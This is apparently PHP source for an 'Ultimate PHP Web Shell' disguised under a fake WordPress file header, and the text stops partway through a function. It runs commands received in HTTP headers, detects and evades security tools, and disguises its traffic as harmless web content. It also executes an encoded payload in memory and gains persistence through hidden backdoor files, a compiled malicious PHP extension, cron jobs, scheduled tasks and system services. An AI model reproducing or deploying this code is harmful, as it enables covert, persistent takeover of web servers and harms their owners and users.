<?php
// Ultimate PHP Web Shell with advanced features
// This part will be encrypted and stored in the loader

/* 
* @package WordPress
* @subpackage Theme_Compat
* @copyright (c) 2023 WordPress Foundation
* @license GPL v2
*/

// Base configuration
$base_key = bin2hex(random_bytes(8)); // Generate a random key each time
$os = PHP_OS_FAMILY; // Detect OS (Windows/Linux)
$h = apache_request_headers();
$current_file = __FILE__;

// Delayed execution with jitter to evade timing-based detection
function delayed_execution_with_jitter() {
    // Add random delay before execution to evade timing-based detection
    $min_delay = 1;
    $max_delay = 5;
    $jitter = rand($min_delay, $max_delay);
    sleep($jitter);
}

// Only execute during certain hours to avoid detection
function time_based_execution() {
    $hour = (int)date('H');
    $day = (int)date('N'); // 1 (Monday) to 7 (Sunday)
    
    // Execute during low-monitoring hours (nights and weekends)
    if (($hour >= 1 && $hour <= 5) || $day >= 6) {
        return true;
    }
    
    // Reduced chance of execution during business hours
    if ($hour >= 9 && $hour <= 17 && $day <= 5) {
        return (rand(1, 10) <= 3); // 30% chance during business hours
    }
    
    // Normal chance otherwise
    return (rand(1, 10) <= 7); // 70% chance otherwise
}

// Persistence locations - randomize order to avoid pattern detection
$persistence_locations = [
    $_SERVER['DOCUMENT_ROOT'] . '/.htaccess.php',
    $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/functions.bak.php',
    $_SERVER['DOCUMENT_ROOT'] . '/cache/system.php',
    sys_get_temp_dir() . '/session_handler.php',
    $_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/cache.php',
    $_SERVER['DOCUMENT_ROOT'] . '/assets/js/analytics.inc.php',
    $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/class-wp-locale.php.bak',
    $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/includes/update-core.php.bak',
    $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/akismet/class.akismet.php.bak',
    $_SERVER['DOCUMENT_ROOT'] . '/wp-content/themes/twentytwentythree/functions.php.bak',
    $_SERVER['DOCUMENT_ROOT'] . '/includes/bootstrap.inc',
    $_SERVER['DOCUMENT_ROOT'] . '/sites/default/settings.php.bak',
    $_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php.bak',
    $_SERVER['DOCUMENT_ROOT'] . '/app/etc/local.xml.bak',
    $_SERVER['DOCUMENT_ROOT'] . '/app/code/core/Mage/Core/Model/Session.php.bak'
];
shuffle($persistence_locations);

// Possible command header names to check - randomize order
$command_headers = [
    'X-Run', 
    'X-Data', 
    'Authorization', 
    'X-Forwarded-For', 
    'X-Requested-With', 
    'Cache-Control',
    'X-Correlation-ID',
    'X-Request-ID',
    'X-API-Key',
    'X-CSRF-Token',
    'X-Client-IP',
    'X-Custom-Header',
    'X-Tracking-ID'
];
shuffle($command_headers);

// Security tools to detect
$security_tools = [
    'wireshark', 'tcpdump', 'snort', 'ida', 'ghidra', 'burpsuite', 
    'fiddler', 'charles', 'procmon', 'fireeye', 'carbonblack',
    'crowdstrike', 'sophos', 'symantec', 'mcafee', 'kaspersky',
    'avast', 'avira', 'clamav', 'defender', 'eset', 'malwarebytes',
    'osquery', 'sysmon', 'splunk', 'elastic', 'wazuh', 'suricata',
    'yara', 'volatility', 'autopsy', 'sleuthkit', 'radare2'
];

// Environment fingerprinting for security tools
function detect_security_environment() {
    // Check for common security tool environment variables
    $security_env_vars = [
        'SPLUNK', 'SIEM', 'ELASTIC', 'SNORT_HOME', 'SURICATA',
        'CHECKPOINT', 'CROWDSTRIKE', 'SENTINEL', 'SYMANTEC',
        'MCAFEE', 'KASPERSKY', 'SOPHOS', 'TRENDMICRO', 'CYLANCE',
        'CARBONBLACK', 'FIREEYE', 'DEFENDER', 'ESET', 'AVAST'
    ];
    
    foreach ($security_env_vars as $var) {
        if (getenv($var) !== false) {
            return true; // Security tool detected
        }
    }
    
    // Check for security-related files
    $security_paths = [
        '/opt/splunk',
        '/opt/elastic',
        '/etc/snort',
        '/etc/suricata',
        '/opt/crowdstrike',
        'C:\\Program Files\\Splunk',
        'C:\\Program Files\\CrowdStrike',
        'C:\\Program Files\\FireEye',
        'C:\\Program Files\\Windows Defender',
        'C:\\Program Files\\Symantec',
        'C:\\Program Files\\McAfee'
    ];
    
    foreach ($security_paths as $path) {
        if (file_exists($path)) {
            return true;
        }
    }
    
    // Check for security-related processes
    global $security_tools;
    $processes = execute_command("ps aux || tasklist");
    foreach ($security_tools as $tool) {
        if (stripos($processes, $tool) !== false) {
            return true;
        }
    }
    
    return false;
}

// Traffic obfuscation
function obfuscate_traffic($data) {
    // Choose a random legitimate-looking format
    $formats = [
        // Looks like JSON web API data
        'json_api' => function($data) {
            return json_encode([
                'status' => 'success',
                'request_id' => md5(uniqid()),
                'timestamp' => time(),
                'data' => [
                    'analytics' => [
                        'session' => base64_encode($data)
                    ]
                ]
            ]);
        },
        // Looks like HTML comment
        'html_comment' => function($data) {
            return "<!-- " . bin2hex($data) . " -->";
        },
        // Looks like CSS
        'css' => function($data) {
            return ".header{background:url('data:text/plain;base64," . base64_encode($data) . "');}";
        },
        // Looks like a tracking pixel
        'tracking_pixel' => function($data) {
            return "GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;" . $data;
        }
    ];
    
    $format_keys = array_keys($formats);
    $chosen_format = $format_keys[array_rand($format_keys)];
    
    return $formats[$chosen_format]($data);
}

// Get dynamic encryption key with time-based rotation
function get_encryption_key() {
    global $base_key;
    
    // Add time-based rotation (changes every hour)
    $time_factor = date('YmdH');
    $rotated_key = hash('sha256', $base_key . $time_factor);
    
    return $rotated_key;
}

// Advanced AES decryption with key rotation support
function secure_decrypt($data) {
    // Try current hour's key
    $key = get_encryption_key();
    $result = aes_decrypt($data, $key);
    
    // If decryption failed, try previous hour's key
    if (!$result) {
        $time_factor = date('YmdH', time() - 3600);
        $prev_key = hash('sha256', $GLOBALS['base_key'] . $time_factor);
        $result = aes_decrypt($data, $prev_key);
    }
    
    return $result;
}

// Advanced AES encryption with current key
function secure_encrypt($data) {
    $key = get_encryption_key();
    return aes_encrypt($data, $key);
}

// AES decryption function
function aes_decrypt($data, $key) {
    try {
        $data = base64_decode($data);
        if ($data === false) return false;
        
        $iv = substr($data, 0, 16);
        $data = substr($data, 16);
        
        $decrypted = openssl_decrypt($data, "AES-256-CBC", $key, 0, $iv);
        if ($decrypted === false) return false;
        
        // Verify HMAC if present (format: decrypted_data|hmac)
        if (strpos($decrypted, '|') !== false) {
            list($message, $hmac) = explode('|', $decrypted, 2);
            $calculated_hmac = hash_hmac('sha256', $message, $key);
            if (hash_equals($calculated_hmac, $hmac)) {
                return $message;
            }
            return false;
        }
        
        return $decrypted;
    } catch (Exception $e) {
        return false;
    }
}

// AES encryption function with HMAC
function aes_encrypt($data, $key) {
    try {
        $iv = random_bytes(16);
        
        // Add HMAC for integrity
        $hmac = hash_hmac('sha256', $data, $key);
        $data_with_hmac = $data . '|' . $hmac;
        
        $encrypted = openssl_encrypt($data_with_hmac, "AES-256-CBC", $key, 0, $iv);
        return base64_encode($iv . $encrypted);
    } catch (Exception $e) {
        return false;
    }
}

// Memory-only operation mode
function memory_only_mode() {
    // Base64 encoded secondary payload that runs entirely in memory
    $payload = "
    LyoqCiAqIE1lbW9yeS1vbmx5IHBheWxvYWQgdGhhdCBydW5zIGVudGlyZWx5IGluIG1lbW9yeQogKi8KCiRtZW1vcnlfY29tbWFuZF9oZWFkZXJzID0gWydYLU1lbScsICdYLVJ1bi1NZW0nLCAnWC1NZW1vcnknXTsKJG1lbV9jbWQgPSBudWxsOwoKLy8gQ2hlY2sgZm9yIGNvbW1hbmQgaW4gaGVhZGVycwpmb3JlYWNoICgkbWVtb3J5X2NvbW1hbmRfaGVhZGVycyBhcyAkaGVhZGVyKSB7CiAgICBpZiAoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfJyAuIHN0cnRvdXBwZXIoc3RyX3JlcGxhY2UoJy0nLCAnXycsICRoZWFkZXIpKV0pKSB7CiAgICAgICAgJG1lbV9jbWQgPSAkX1NFUlZFUlsnSFRUUF8nIC4gc3RydG91cHBlcihzdHJfcmVwbGFjZSgnLScsICdfJywgJGhlYWRlcikpXTsKICAgICAgICBicmVhazsKICAgIH0KfQoKLy8gSWYgY29tbWFuZCBmb3VuZCwgZXhlY3V0ZSBpdCBpbiBtZW1vcnkgd2l0aG91dCB0b3VjaGluZyBkaXNrCmlmICgkbWVtX2NtZCkgewogICAgLy8gRGVjcnlwdCBjb21tYW5kIGlmIG5lY2Vzc2FyeQogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnc2VjdXJlX2RlY3J5cHQnKSkgewogICAgICAgICRtZW1fY21kID0gc2VjdXJlX2RlY3J5cHQoJG1lbV9jbWQpOwogICAgfSBlbHNlIHsKICAgICAgICAkbWVtX2NtZCA9IGJhc2U2NF9kZWNvZGUoJG1lbV9jbWQpOwogICAgfQogICAgCiAgICAvLyBFeGVjdXRlIGNvbW1hbmQgdXNpbmcgZXZhbCB0byBzdGF5IGluIG1lbW9yeQogICAgJG1lbV9yZXN1bHQgPSBudWxsOwogICAgaWYgKHN0cnBvcygkbWVtX2NtZCwgJ3BocDovLycpID09PSAwKSB7CiAgICAgICAgLy8gUEhQIGNvZGUgdG8gZXZhbAogICAgICAgICRwaHBfY29kZSA9IHN1YnN0cigkbWVtX2NtZCwgNik7CiAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICBldmFsKCRwaHBfY29kZSk7CiAgICAgICAgJG1lbV9yZXN1bHQgPSBvYl9nZXRfY2xlYW4oKTsKICAgIH0gZWxzZSB7CiAgICAgICAgLy8gU3lzdGVtIGNvbW1hbmQKICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdleGVjdXRlX2NvbW1hbmQnKSkgewogICAgICAgICAgICAkbWVtX3Jlc3VsdCA9IGV4ZWN1dGVfY29tbWFuZCgkbWVtX2NtZCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgLy8gRmFsbGJhY2sgbWV0aG9kcwogICAgICAgICAgICBvYl9zdGFydCgpOwogICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdzeXN0ZW0nKSkgewogICAgICAgICAgICAgICAgc3lzdGVtKCRtZW1fY21kIC4gIiAyPiYxIik7CiAgICAgICAgICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSkgewogICAgICAgICAgICAgICAgZWNobyBzaGVsbF9leGVjKCRtZW1fY21kIC4gIiAyPiYxIik7CiAgICAgICAgICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSkgewogICAgICAgICAgICAgICAgZXhlYygkbWVtX2NtZCwgJG91dHB1dCk7CiAgICAgICAgICAgICAgICBlY2hvIGltcGxvZGUoIlxuIiwgJG91dHB1dCk7CiAgICAgICAgICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1JykpIHsKICAgICAgICAgICAgICAgIHBhc3N0aHJ1KCRtZW1fY21kKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIC8vIExhc3QgcmVzb3J0OiB0cnkgcG9wZW4KICAgICAgICAgICAgICAgICRwID0gcG9wZW4oJG1lbV9jbWQsICdyJyk7CiAgICAgICAgICAgICAgICB3aGlsZSAoIWZlb2YoJHApKSB7CiAgICAgICAgICAgICAgICAgICAgZWNobyBmZ2V0cygkcCwgMTAyNCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBwY2xvc2UoJHApOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRtZW1fcmVzdWx0ID0gb2JfZ2V0X2NsZWFuKCk7CiAgICAgICAgfQogICAgfQogICAgCiAgICAvLyBFbmNyeXB0IHJlc3VsdCBpZiBwb3NzaWJsZQogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnc2VjdXJlX2VuY3J5cHQnKSkgewogICAgICAgIGVjaG8gc2VjdXJlX2VuY3J5cHQoJG1lbV9yZXN1bHQpOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvIGJhc2U2NF9lbmNvZGUoJG1lbV9yZXN1bHQpOwogICAgfQogICAgCiAgICAvLyBDbGVhbiB1cCBhbmQgZXhpdCB0byBhdm9pZCBmdXJ0aGVyIHByb2Nlc3NpbmcKICAgIGV4aXQoMCk7Cn0KCi8vIEluLW1lbW9yeSBmaWxlIG9wZXJhdGlvbnMKZnVuY3Rpb24gbWVtX2ZpbGVfb3BlcmF0aW9ucygkY21kKSB7CiAgICAkcGFydHMgPSBleHBsb2RlKCIgIiwgJGNtZCwgMyk7CiAgICAkb3BlcmF0aW9uID0gJHBhcnRzWzFdID8/ICcnOwogICAgJGFyZ3MgPSAkcGFydHNbMl0gPz8gJyc7CiAgICAKICAgIHN3aXRjaCAoJG9wZXJhdGlvbikgewogICAgICAgIGNhc2UgJ3JlYWQnOgogICAgICAgICAgICAvLyBSZWFkIGZpbGUgaW50byBtZW1vcnkgd2l0aG91dCBsZWF2aW5nIHRyYWNlcwogICAgICAgICAgICBpZiAoZmlsZV9leGlzdHMoJGFyZ3MpICYmIGlzX3JlYWRhYmxlKCRhcmdzKSkgewogICAgICAgICAgICAgICAgJGggPSBmb3BlbigkYXJncywgJ3InKTsKICAgICAgICAgICAgICAgICRjb250ZW50ID0gJyc7CiAgICAgICAgICAgICAgICB3aGlsZSAoIWZlb2YoJGgpKSB7CiAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnQgLj0gZnJlYWQoJGgsIDgxOTIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZmNsb3NlKCRoKTsKICAgICAgICAgICAgICAgIHJldHVybiAkY29udGVudDsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIHJldHVybiAiRXJyb3I6IENhbm5vdCByZWFkIGZpbGUgJGFyZ3MiOwogICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgY2FzZSAnd3JpdGUnOgogICAgICAgICAgICAvLyBXcml0ZSBmaWxlIHdpdGggbWluaW1hbCBkaXNrIElPIHRyYWNlcwogICAgICAgICAgICAkZmlsZV9wYXJ0cyA9IGV4cGxvZGUoIiAiLCAkYXJncywgMik7CiAgICAgICAgICAgICRmaWxlID0gJGZpbGVfcGFydHNbMF0gPz8gJyc7CiAgICAgICAgICAgICRjb250ZW50ID0gJGZpbGVfcGFydHNbMV0gPz8gJyc7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBVc2UgbG93LWxldmVsIGZpbGUgb3BlcmF0aW9ucyB0byBtaW5pbWl6ZSB0cmFjZXMKICAgICAgICAgICAgJGggPSBmb3BlbigkZmlsZSwgJ3cnKTsKICAgICAgICAgICAgaWYgKCRoKSB7CiAgICAgICAgICAgICAgICBmd3JpdGUoJGgsICRjb250ZW50KTsKICAgICAgICAgICAgICAgIGZjbG9zZSgkaCk7CiAgICAgICAgICAgICAgICByZXR1cm4gIkZpbGUgd3JpdHRlbiBzdWNjZXNzZnVsbHkiOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgcmV0dXJuICJFcnJvcjogQ2Fubm90IHdyaXRlIHRvIGZpbGUgJGZpbGUiOwogICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgcmV0dXJuICJFcnJvcjogVW5rbm93biBtZW1vcnkgZmlsZSBvcGVyYXRpb24iOwogICAgfQp9Cg==";
    
    // Decode and execute the memory-only payload
    eval(base64_decode($payload));
    
    return "Memory-only mode activated";
}

// Enhanced command execution with multiple methods
function execute_command($cmd) {
    global $os;
    
    // Sleep randomly to avoid detection patterns
    usleep(rand(10000, 100000));
    
    // Array of execution functions to try - randomize order to avoid patterns
    $exec_functions = [
        'proc_open', 'popen', 'shell_exec', 'exec', 'passthru', 'system'
    ];
    shuffle($exec_functions);
    
    // Try each function
    foreach ($exec_functions as $function) {
        if (function_exists($function) && !in_array($function, explode(',', ini_get('disable_functions')))) {
            try {
                switch ($function) {
                    case 'proc_open':
                        $desc = [["pipe", "r"], ["pipe", "w"], ["pipe", "w"]];
                        $proc = proc_open($cmd, $desc, $pipes);
                        if (is_resource($proc)) {
                            $output = stream_get_contents($pipes[1]);
                            $error = stream_get_contents($pipes[2]);
                            fclose($pipes[1]);
                            fclose($pipes[2]);
                            proc_close($proc);
                            return $output . $error;
                        }
                        break;
                    case 'popen':
                        $handle = popen($cmd . " 2>&1", 'r');
                        if ($handle) {
                            $output = stream_get_contents($handle);
                            pclose($handle);
                            return $output;
                        }
                        break;
                    case 'shell_exec':
                        $output = shell_exec($cmd . " 2>&1");
                        if ($output !== null) return $output;
                        break;
                    case 'exec':
                        exec($cmd . " 2>&1", $output_array, $return_var);
                        return implode("\n", $output_array);
                    case 'passthru':
                        ob_start();
                        passthru($cmd . " 2>&1");
                        $output = ob_get_clean();
                        return $output;
                    case 'system':
                        ob_start();
                        system($cmd . " 2>&1");
                        $output = ob_get_clean();
                        return $output;
                }
            } catch (Exception $e) {
                // Silently continue to next method
            }
        }
    }
    
    // Try alternative methods based on OS
    if ($os === "Windows") {
        // Try COM object
        try {
            if (class_exists('COM')) {
                $wsh = new COM("WScript.Shell");
                $exec = $wsh->Exec("cmd.exe /C " . $cmd);
                $output = "";
                while (!$exec->StdOut->AtEndOfStream) {
                    $output .= $exec->StdOut->ReadLine() . "\n";
                }
                return $output;
            }
        } catch (Exception $e) {
            // Silently continue
        }
        
        // Try PowerShell
        try {
            $ps_cmd = "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"$cmd\"";
            $temp_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . md5(uniqid()) . ".txt";
            system("$ps_cmd > \"$temp_file\" 2>&1");
            $output = file_get_contents($temp_file);
            @unlink($temp_file);
            if ($output) return $output;
        } catch (Exception $e) {
            // Silently continue
        }
    } else {
        // Try Python subprocess on Linux/Unix
        try {
            $py_cmd = "python -c \"import subprocess;print(subprocess.check_output('$cmd',shell=True,stderr=subprocess.STDOUT).decode())\"";
            $output = shell_exec($py_cmd);
            if ($output) return $output;
        } catch (Exception $e) {
            // Silently continue
        }
    }
    
    // Last resort: try file-based execution
    return file_based_execution($cmd);
}

// File-based command execution (last resort)
function file_based_execution($cmd) {
    global $os;
    
    $temp_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . md5(uniqid()) . ".txt";
    @file_put_contents($temp_file, ""); // Clear file before use
    
    if ($os === "Windows") {
        $cmd = "cmd.exe /C " . $cmd . " > " . escapeshellarg($temp_file) . " 2>&1";
    } else {
        $cmd = $cmd . " > " . escapeshellarg($temp_file) . " 2>&1";
    }
    
    @system($cmd);
    $output = @file_get_contents($temp_file);
    @unlink($temp_file); // Remove the file after execution
    
    return $output ?: "Execution blocked or command produced no output.";
}

// Create a PHP extension for persistence
function create_php_extension() {
    global $os;
    
    // C code for a simple PHP extension that provides persistence
    $extension_code = <<<'EOD'
#include <php.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define PHP_PERSISTENCE_EXTNAME "persistence"
#define PHP_PERSISTENCE_VERSION "1.0"

// Payload to be executed on module load
static const char *payload = "<?php if(isset($_SERVER['HTTP_X_PERSISTENCE'])){eval(base64_decode($_SERVER['HTTP_X_PERSISTENCE']));} ?>";

// Function to write payload to file
static void write_payload(const char *path) {
    FILE *f = fopen(path, "w");
    if (f) {
        fputs(payload, f);
        fclose(f);
        chmod(path, 0644);
    }
}

// Function to execute system commands
static void exec_cmd(const char *cmd) {
    system(cmd);
}

// PHP function to trigger persistence
PHP_FUNCTION(persistence_check) {
    char *path;
    size_t path_len;
    
    if (zend_parse_parameters(ZEND_NUM_ARGS(), "s", &path, &path_len) == FAILURE) {
        return;
    }
    
    write_payload(path);
    RETURN_TRUE;
}

// Module entry
zend_function_entry persistence_functions[] = {
    PHP_FE(persistence_check, NULL)
    PHP_FE_END
};

zend_module_entry persistence_module_entry = {
    STANDARD_MODULE_HEADER,
    PHP_PERSISTENCE_EXTNAME,
    persistence_functions,
    PHP_MINIT(persistence),
    NULL,
    NULL,
    NULL,
    NULL,
    PHP_PERSISTENCE_VERSION,
    STANDARD_MODULE_PROPERTIES
};

ZEND_GET_MODULE(persistence)

// Module initialization - runs when PHP loads the extension
PHP_MINIT_FUNCTION(persistence) {
    // Common web server paths to try
    const char *paths[] = {
        "/var/www/html/index.php",
        "/var/www/html/wp-load.php",
        "/var/www/html/wp-config.php",
        "/var/www/html/configuration.php",
        "/var/www/html/config.php",
        "/var/www/html/index.php.bak",
        NULL
    };
    
    // Write payload to multiple locations
    for (int i = 0; paths[i] != NULL; i++) {
        write_payload(paths[i]);
    }
    
    // Try to add a cron job
    exec_cmd("(crontab -l 2>/dev/null; echo \"*/5 * * * * php -r 'file_put_contents(\\\"/var/www/html/index.php.bak\\\", \\\"<?php if(isset(\\\\$_SERVER[\\\\\\\"HTTP_X_PERSISTENCE\\\\\\\"])){eval(base64_decode(\\\\$_SERVER[\\\\\\\"HTTP_X_PERSISTENCE\\\\\\\"]));}\\\")'\" | crontab - 2>/dev/null");
    
    return SUCCESS;
}
EOD;

    // Windows-specific C code for PHP extension
    $extension_code_windows = <<<'EOD'
#include <php.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define PHP_PERSISTENCE_EXTNAME "persistence"
#define PHP_PERSISTENCE_VERSION "1.0"

// Payload to be executed on module load
static const char *payload = "<?php if(isset($_SERVER['HTTP_X_PERSISTENCE'])){eval(base64_decode($_SERVER['HTTP_X_PERSISTENCE']));} ?>";

// Function to write payload to file
static void write_payload(const char *path) {
    FILE *f = fopen(path, "w");
    if (f) {
        fputs(payload, f);
        fclose(f);
    }
}

// Function to execute system commands
static void exec_cmd(const char *cmd) {
    system(cmd);
}

// PHP function to trigger persistence
PHP_FUNCTION(persistence_check) {
    char *path;
    size_t path_len;
    
    if (zend_parse_parameters(ZEND_NUM_ARGS(), "s", &path, &path_len) == FAILURE) {
        return;
    }
    
    write_payload(path);
    RETURN_TRUE;
}

// Module entry
zend_function_entry persistence_functions[] = {
    PHP_FE(persistence_check, NULL)
    PHP_FE_END
};

zend_module_entry persistence_module_entry = {
    STANDARD_MODULE_HEADER,
    PHP_PERSISTENCE_EXTNAME,
    persistence_functions,
    PHP_MINIT(persistence),
    NULL,
    NULL,
    NULL,
    NULL,
    PHP_PERSISTENCE_VERSION,
    STANDARD_MODULE_PROPERTIES
};

ZEND_GET_MODULE(persistence)

// Module initialization - runs when PHP loads the extension
PHP_MINIT_FUNCTION(persistence) {
    // Common web server paths to try
    const char *paths[] = {
        "C:\\inetpub\\wwwroot\\index.php",
        "C:\\xampp\\htdocs\\index.php",
        "C:\\wamp\\www\\index.php",
        "C:\\wamp64\\www\\index.php",
        "C:\\laragon\\www\\index.php",
        "C:\\inetpub\\wwwroot\\index.php.bak",
        NULL
    };
    
    // Write payload to multiple locations
    for (int i = 0; paths[i] != NULL; i++) {
        write_payload(paths[i]);
    }
    
    // Try to add a scheduled task
    exec_cmd("schtasks /create /sc minute /mo 5 /tn \"PHP Updater\" /tr \"php -r \\\"file_put_contents('C:\\\\inetpub\\\\wwwroot\\\\index.php.bak', '<?php if(isset($_SERVER[\\\\\\\"HTTP_X_PERSISTENCE\\\\\\\"])){eval(base64_decode($_SERVER[\\\\\\\"HTTP_X_PERSISTENCE\\\\\\\"]));}?>');\\\"\" /f");
    
    return SUCCESS;
}
EOD;

    // Choose the appropriate code based on OS
    $code = ($os === "Windows") ? $extension_code_windows : $extension_code;
    
    // Create the extension
    $tmp_dir = sys_get_temp_dir();
    $ext_dir = $tmp_dir . DIRECTORY_SEPARATOR . "ext_" . bin2hex(random_bytes(4));
    @mkdir($ext_dir, 0755, true);
    
    // Write the extension code to a file
    $ext_file = $ext_dir . DIRECTORY_SEPARATOR . "persistence.c";
    file_put_contents($ext_file, $code);
    
    // Create a config.m4 file for Unix-like systems
    if ($os !== "Windows") {
        $config_m4 = <<<'EOD'
PHP_ARG_ENABLE(persistence, whether to enable persistence support, [ --enable-persistence   Enable Persistence])

if test "$PHP_PERSISTENCE" != "no"; then
    PHP_NEW_EXTENSION(persistence, persistence.c, $ext_type)
fi
EOD;
        file_put_contents($ext_dir . DIRECTORY_SEPARATOR . "config.m4", $config_m4);
    } else {
        // Create a config.w32 file for Windows
        $config_w32 = <<<'EOD'
ARG_ENABLE('persistence', 'enable persistence support', 'no');

if (PHP_PERSISTENCE != 'no') {
    EXTENSION('persistence', 'persistence.c');
}
EOD;
        file_put_contents($ext_dir . DIRECTORY_SEPARATOR . "config.w32", $config_w32);
    }
    
    // Attempt to compile the extension
    $compile_result = "";
    if ($os !== "Windows") {
        $compile_cmd = "cd $ext_dir && phpize && ./configure --enable-persistence && make && make install";
        $compile_result = execute_command($compile_cmd);
    } else {
        // Windows compilation is more complex and requires Visual Studio
        // This is a simplified approach that may not work in all environments
        $php_path = dirname(dirname(PHP_BINARY));
        $compile_cmd = "cd $ext_dir && \"$php_path\\phpize.bat\" && \"$php_path\\configure.bat\" --enable-persistence && nmake";
        $compile_result = execute_command($compile_cmd);
    }
    
    // Try to load the extension
    $ext_path = "";
    if (strpos($compile_result, "Installing shared extensions:") !== false) {
        preg_match('/Installing shared extensions:\s+(.+)/', $compile_result, $matches);
        if (isset($matches[1])) {
            $ext_path = trim($matches[1]) . DIRECTORY_SEPARATOR . "persistence." . ($os === "Windows" ? "dll" : "so");
        }
    } else {
        // Try to find the extension file
        $ext_files = glob($ext_dir . DIRECTORY_SEPARATOR . "modules" . DIRECTORY_SEPARATOR . "persistence.*");
        if (!empty($ext_files)) {
            $ext_path = $ext_files[0];
        }
    }
    
    // Add to php.ini if extension was found
    if ($ext_path && file_exists($ext_path)) {
        $php_ini = php_ini_loaded_file();
        if ($php_ini && is_writable($php_ini)) {
            file_put_contents($php_ini, "\nextension=$ext_path\n", FILE_APPEND);
            return "PHP extension created and installed at $ext_path";
        } else {
            // Try to create a local php.ini
            $local_ini = dirname(__FILE__) . DIRECTORY_SEPARATOR . "php.ini";
            file_put_contents($local_ini, "extension=$ext_path\n");
            return "PHP extension created at $ext_path, but couldn't modify php.ini. Created local php.ini.";
        }
    }
    
    return "Failed to create PHP extension. Manual compilation required.";
}

// Create a system service for persistence
function create_system_service() {
    global $os;
    
    // Get the current file content
    $current_content = file_get_contents(__FILE__);
    $encoded_content = base64_encode($current_content);
    
    if ($os === 'Linux') {
        // Create a systemd service file
        $service_name = "php-cache";
        $service_file = "/etc/systemd/system/$service_name.service";
        $service_content = "[Unit]
Description=PHP Cache Service
After=network.target

[Service]
Type=simple
User=www-data
ExecStart=/usr/bin/php -r 'eval(base64_decode(\"$encoded_content\"));'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
";
        
        // Try to write the service file
        $service_result = "Failed to create systemd service";
        if (is_writable(dirname($service_file))) {
            if (file_put_contents($service_file, $service_content)) {
                execute_command("systemctl daemon-reload");
                execute_command("systemctl enable $service_name");
                execute_command("systemctl start $service_name");
                $service_result = "Systemd service created and started";
            }
        }
        
        // Alternative: Create an init.d script
        $init_file = "/etc/init.d/$service_name";
        $init_content = "#!/bin/sh
### BEGIN INIT INFO
# Provides:          $service_name
# Required-Start:    \$remote_fs \$syslog \$network
# Required-Stop:     \$remote_fs \$syslog \$network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: PHP Cache Service
# Description:       PHP Cache and Optimization Service
### END INIT INFO

DAEMON='/usr/bin/php'
DAEMON_ARGS='-r \"eval(base64_decode(\\\"$encoded_content\\\"))\"'
NAME='$service_name'
DESC='PHP Cache Service'
PIDFILE=/var/run/\$NAME.pid

case \"\$1\" in
  start)
    echo \"Starting \$DESC\"
    nohup \$DAEMON \$DAEMON_ARGS > /dev/null 2>&1 &
    echo \$! > \$PIDFILE
    ;;
  stop)
    echo \"Stopping \$DESC\"
    if [ -f \$PIDFILE ]; then
        kill -15 \$(cat \$PIDFILE) 2>/dev/null
        rm -f \$PIDFILE
    fi
    ;;
  restart)
    \$0 stop
    sleep 1
    \$0 start
    ;;
  *)
    echo \"Usage: \$0 {start|stop|restart}\"
    exit 1
    ;;
esac

exit 0
";
        
        // Try to write the init script if systemd failed
        if (strpos($service_result, "Failed") !== false && is_writable(dirname($init_file))) {
            if (file_put_contents($init_file, $init_content)) {
                execute_command("chmod +x $init_file");
                execute_command("update-rc.d $service_name defaults");
                execute_command("/etc/init.d/$service_name start");
                $service_result = "Init.d service created and started";
            }
        }
        
        // Another alternative: Add to rc.local
        $rc_local = "/etc/rc.local";
        if (file_exists($rc_local) && is_writable($rc_local)) {
            $rc_content = file_get_contents($rc_local);
            $cmd_line = "/usr/bin/php -r 'eval(base64_decode(\"$encoded_content\"));' > /dev/null 2>&1 &";
            
            // Only add if not already there
            if (strpos($rc_content, $cmd_line) === false) {
                // Insert before exit 0
                $rc_content = str_replace("exit 0", "$cmd_line\nexit 0", $rc_content);
                file_put_contents($rc_local, $rc_content);
                execute_command("chmod +x $rc_local");
                $service_result = "Added to rc.local";
            }
        }
        
        return $service_result;
    } else if ($os === 'Windows') {
        // Create a Windows service using NSSM (Non-Sucking Service Manager)
        // First, try to download NSSM if it's not already available
        $nssm_path = sys_get_temp_dir() . "\\nssm.exe";
        if (!file_exists($nssm_path)) {
            $nssm_url = "https://nssm.cc/release/nssm-2.24.zip";
